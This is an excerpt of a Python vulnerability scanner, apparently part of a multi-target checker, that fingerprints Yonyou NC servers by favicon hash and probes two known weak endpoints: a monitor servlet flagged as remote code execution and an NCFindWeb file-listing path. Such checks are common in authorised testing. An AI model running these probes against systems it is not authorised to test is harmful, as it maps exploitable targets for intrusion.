...
class Detect(threading.Thread):
    ...
    def check(self, url):
        ...
        try:
            ...
            if the_md5 == 'a5dccf6af79f420f7ea2f2becb6fafa5':
                ...
                self.vul_list.append(['yongyou', url, 'Yes'])
                return True
            else:
                return False
    ...
    # 漏洞1
    def rce1(self, url):
        rce1_url = url + '/service/monitorservlet'
        try:
            res = requests.get(url=rce1_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
            if res.status_code == 500:
                tqdm.write(Fore.RED + '[yongyou RCE] {}'.format(rce1_url))
                self.vul_list.append(['yongyou RCE', url, 'Yes {}'.format(rce1_url)])
        except Exception as e:
            return False

    def readFile(self, url):
        readFile_url = url + '/NCFindWeb?service=&filename='
        try:
            res = requests.get(url=readFile_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=10)
            if r'InstallProperties_en.properties' in res.text:
                tqdm.write(Fore.RED + '[yongyou ReadFile] {}'.format(readFile_url))
                self.vul_list.append(['yongyou ReadFile', url, 'Yes {}'.format(readFile_url)])
        except Exception as e:
            return False
